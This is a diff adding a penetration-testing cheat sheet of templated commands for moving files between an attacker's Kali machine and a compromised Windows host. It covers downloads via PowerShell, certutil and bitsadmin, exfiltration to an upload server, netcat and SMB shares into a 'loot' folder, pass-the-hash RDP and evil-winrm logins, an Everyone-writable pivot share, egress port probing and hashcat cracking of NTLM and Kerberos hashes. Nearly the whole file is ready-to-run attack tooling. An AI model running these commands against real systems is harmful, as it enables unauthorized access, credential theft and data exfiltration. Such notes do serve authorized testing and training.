@@ -1,0 +1,74 @@
+# === KALI: START SERVERS ===
+# HTTP server (serve files to target)
+python3 -m http.server {{KALI_PORT}}
+# Upload receiver (needed for PowerShell POST uploads)
+python3 -m uploadserver {{KALI_PORT}}
+# SMB share (most reliable for Windows — no PowerShell needed)
+sudo impacket-smbserver share . -smb2support
+sudo impacket-smbserver share . -smb2support -username {{USER}} -password {{PASS}}
+# Netcat listener
+rlwrap nc -nvlp {{KALI_PORT}}
+
+# === WINDOWS: DOWNLOAD FROM KALI ===
+# PowerShell IWR (preferred)
+powershell -nop -c "iwr http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}} -OutFile C:\Windows\Temp\{{FILENAME}}"
+powershell -nop -c "(New-Object Net.WebClient).DownloadFile('http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}','C:\Windows\Temp\{{FILENAME}}')"
+# certutil (when PowerShell blocked)
+certutil -urlcache -split -f http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}} C:\Windows\Temp\{{FILENAME}}
+# bitsadmin (last resort - older Windows)
+bitsadmin /transfer job /download /priority normal http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}} C:\Windows\Temp\{{FILENAME}}
+# SMB (no HTTP needed)
+copy \\{{KALI}}\share\{{FILENAME}} C:\Windows\Temp\{{FILENAME}}
+net use Z: \\{{KALI}}\share
+copy Z:\{{FILENAME}} C:\Windows\Temp\{{FILENAME}}
+
+# === WINDOWS: UPLOAD TO KALI ===
+# PowerShell POST to uploadserver
+powershell -c "Invoke-WebRequest -Uri http://{{KALI}}:{{KALI_PORT}}/upload -Method POST -InFile C:\path\to\file"
+# SMB copy to share
+copy C:\path\to\file \\{{KALI}}\share\{{FILENAME}}
+# Netcat (start nc -lvnp {{KALI_PORT}} > outfile on Kali first)
+type C:\path\to\file | C:\Windows\Temp\nc.exe {{KALI}} {{KALI_PORT}}
+# WinRM (if evil-winrm session active)
+download C:\path\to\file /home/kali/loot/{{FILENAME}}
+# Base64 encode for copy-paste
+powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\path\to\file'))"
+# Decode on Kali
+echo '<BASE64_STRING>' | base64 -d > {{FILENAME}}
+certutil -hashfile {{FILENAME}} MD5
+
+# === RDP WITH KALI SHARE ===
+# Maps /home/kali/share as a drive inside the RDP session
+xfreerdp3 /cert-ignore /u:{{USER}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/share
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/share
+# Pass the hash RDP
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /pth:{{NTLM_HASH}} /v:{{TARGET}} /drive:share,/home/kali/share
+# Inside RDP session - copy from Kali share
+copy \\tsclient\share\{{FILENAME}} C:\Windows\Temp\{{FILENAME}}
+
+# === WINRM / EVIL-WINRM ===
+evil-winrm -I {{TARGET}} -u {{USER}} -p {{PASS}}
+evil-winrm -I {{TARGET}} -u {{USER}} -H {{NTLM_HASH}}
+# Once connected - upload/download
+upload /home/kali/{{FILENAME}} C:\Windows\Temp\{{FILENAME}}
+download C:\path\to\file /home/kali/loot/
+
+# === INTERNAL SHARE (pivot - move data between foothold and internal host) ===
+# Create share on foothold
+mkdir C:\temp
+net share ShareName="C:\temp" /GRANT:Everyone,FULL
+# From internal host - copy to/from foothold share
+copy \\{{TARGET}}\ShareName\{{FILENAME}} C:\temp\
+copy C:\loot\file \\{{TARGET}}\ShareName\file
+# Then move from foothold back to Kali
+copy C:\temp\file \\{{KALI}}\share\file
+
+# === FIND EGRESS PORTS ===
+# Identify which ports can reach Kali (run on target)
+foreach ($port in @(21,22,80,139,443,445,8080,8443)) { try { $t = New-Object System.Net.Sockets.TcpClient("{{KALI}}",$port); Write-Host "Port $port reachable"; $t.Close() } catch {} }
+
+# === HASH CRACKING ===
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
